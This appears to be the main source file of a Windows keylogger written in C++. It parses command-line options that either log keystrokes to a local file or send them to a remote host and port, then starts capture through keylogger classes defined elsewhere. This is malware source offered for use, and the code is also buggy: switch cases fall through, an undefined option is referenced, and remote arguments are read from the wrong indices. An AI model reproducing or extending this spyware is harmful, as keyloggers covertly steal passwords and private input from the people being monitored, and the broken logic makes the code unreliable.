#include "./main.hpp"

string* g_file_path = new string(DEFAULT_FILE_PATH);

keylogger* g_keylogger;

BOOL exit_program()
{
	delete g_file_path;

	delete g_keylogger;

	exit (EXIT_FAILURE);
}

void initialize_options(int p_arguments_number, char** p_arguments_value)
{
	int t_result_option = 0;
	int t_option_index = 0;
	struct option t_long_options[] =
	{
		{
			LONG_OPTION_LOCAL, required_argument, NULL, SHORT_OPTION_LOCAL
		},
		{
			LONG_OPTION_REMOTE, required_argument, NULL, SHORT_OPTION_REMOTE
		},
		{
			LONG_OPTION_HELP, no_argument, NULL, SHORT_OPTION_HELP
		},
		{
			NULL, 0, NULL, 0
		}
	};

	while ((t_result_option = getopt_long(p_arguments_number, p_arguments_value, "l:r:h:", t_long_options, &t_option_index))
	    != -1)
	{
		switch (t_result_option)
		{
			case 0:
				if (strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_LOCAL)
				    == 0)
				{
					if (g_keylogger != nullptr)
						delete g_keylogger;

					g_keylogger = new keylogger_local(optarg);
				}
				else if (strcasecmp(t_long_options[t_option_index].name,
					LONG_OPTION_FILE_PATH) == 0)
					{
						cout << "file path" << endl;

						g_file_path->clear();

						g_file_path->append(optarg);
					}
					else if (strcasecmp(t_long_options[t_option_index].name,
						LONG_OPTION_REMOTE) == 0)
						{
							if (g_keylogger != nullptr)
								delete g_keylogger;

							g_keylogger = new keylogger_remote(p_arguments_value[t_option_index]++, atoi(p_arguments_value[t_option_index]++));
						}
					else if (strcasecmp(t_long_options[t_option_index].name,
						LONG_OPTION_HELP) == 0)
						{
							print_help();

							exit_program();
						}

			case SHORT_OPTION_LOCAL:
				if (g_keylogger != nullptr)
					delete g_keylogger;

				g_keylogger = new keylogger_local(optarg);
			break;

			case SHORT_OPTION_REMOTE:
				if (g_keylogger != nullptr)
					delete g_keylogger;

				g_keylogger = new keylogger_remote(p_arguments_value[t_option_index]++, atoi(p_arguments_value[t_option_index]++));
			break;

			case SHORT_OPTION_HELP:
				print_help();

				exit_program();
			break;
		}
	}
}

void print_help()
{
	cout << endl;
	cout << HELP_MESSAGE << endl;
	cout << endl;
	cout << HELP_MESSAGE_LOCAL << endl;
	cout << HELP_MESSAGE_LOCAL_EXAMPLE << endl;
	cout << endl;
	cout << HELP_MESSAGE_REMOTE << endl;
	cout << HELP_MESSAGE_REMOTE_EXAMPLE << endl;
	cout << endl;
	cout << HELP_MESSAGE_HELP << endl;
	cout << HELP_MESSAGE_HELP_EXAMPLE << endl;
	exit(EXIT_SUCCESS);
}

int main(int p_arguments_number, char** p_arguments_value)
{
	if (!SetConsoleCtrlHandler((PHANDLER_ROUTINE) exit_program, TRUE))
	{
		cerr << ERROR_MESSAGE_SETCONTROLECTRLHANDLER << endl;
		return EXIT_FAILURE;
	}

	initialize_options(p_arguments_number, p_arguments_value);

	if(g_keylogger != nullptr)
		g_keylogger->start();
	else
		print_help();

	return EXIT_SUCCESS;
}
